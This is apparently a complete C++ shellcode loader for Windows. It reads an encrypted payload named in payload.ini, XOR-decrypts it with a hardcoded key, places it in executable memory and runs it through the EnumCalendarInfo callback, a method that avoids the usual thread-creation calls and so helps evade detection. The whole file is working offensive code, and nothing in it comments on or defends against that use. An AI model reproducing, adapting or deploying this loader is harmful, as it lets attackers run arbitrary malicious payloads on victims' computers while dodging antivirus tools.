#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>


void xor_decrypt(unsigned char* data, std::size_t size, const unsigned char* key, std::size_t key_size) {
    for (std::size_t i = 0; i < size; i++) {
        data[i] ^= key[i % key_size];
    }
}

int main(int argc, char* argv[]) {
    std::string configFilePath = "payload.ini";
    std::ifstream configFile(configFilePath);

    if (!configFile) {
        std::cout << "open config file error: " << configFilePath << std::endl;
        return 1;
    }

    std::string encryptedFilePath;
    std::getline(configFile, encryptedFilePath);

    configFile.close();

    std::ifstream file(encryptedFilePath, std::ios::binary);

    if (!file) {
        std::cout << "open encrypted file error: " << encryptedFilePath << std::endl;
        return 1;
    }

    file.seekg(0, std::ios::end);
    std::size_t fileSize = file.tellg();
    file.seekg(0, std::ios::beg);

    std::vector<unsigned char> encryptedData(fileSize);
    file.read(reinterpret_cast<char*>(encryptedData.data()), fileSize);
    file.close();

    const unsigned char key[] = "SecretKey";
    std::size_t keySize = sizeof(key) - 1;

    xor_decrypt(encryptedData.data(), fileSize, key, keySize);

    unsigned char* shellcode = new unsigned char[fileSize];
    std::copy(encryptedData.begin(), encryptedData.end(), shellcode);

    LPVOID addr = ::VirtualAlloc(nullptr, fileSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ::RtlMoveMemory(addr, shellcode, fileSize);


    ::EnumCalendarInfo((CALINFO_ENUMPROC)addr, LOCALE_USER_DEFAULT, ENUM_ALL_CALENDARS, CAL_SMONTHNAME1);

    delete[] shellcode;

    return 0;
}